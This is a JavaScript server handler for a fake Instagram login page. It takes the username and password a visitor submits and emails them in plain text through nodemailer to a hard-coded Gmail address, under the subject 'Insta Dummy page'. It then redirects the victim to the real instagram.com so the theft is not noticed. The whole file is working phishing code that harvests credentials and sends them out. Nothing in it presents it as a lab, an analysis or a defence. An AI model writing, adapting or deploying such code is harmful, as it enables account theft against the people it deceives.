import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { u_name, pass } = req.body;

  // Validate inputs
  if (!u_name || !pass) {
    return res.status(400).json({ error: 'Please enter correct username or password. Try again' });
  }

  // Check if environment variables are set
  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASSWORD) {
    console.error('Missing EMAIL_USER or EMAIL_PASSWORD environment variables');
    return res.status(500).json({ error: 'Server configuration error. Please check environment variables.' });
  }

  try {
    // Configure your email service
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: 'remeriu02@gmail.com',
      subject: 'Someone Login ! Insta Dummy page',
      text: `Username: ${u_name}\r\nPassword: ${pass}`,
    };

    await transporter.sendMail(mailOptions);

    // Redirect to Instagram after sending
    return res.status(200).json({ 
      success: true, 
      redirect: 'https://www.instagram.com' 
    });
  } catch (error) {
    console.error('Email error:', error);
    return res.status(500).json({ error: `Unable to process request: ${error.message}` });
  }
}
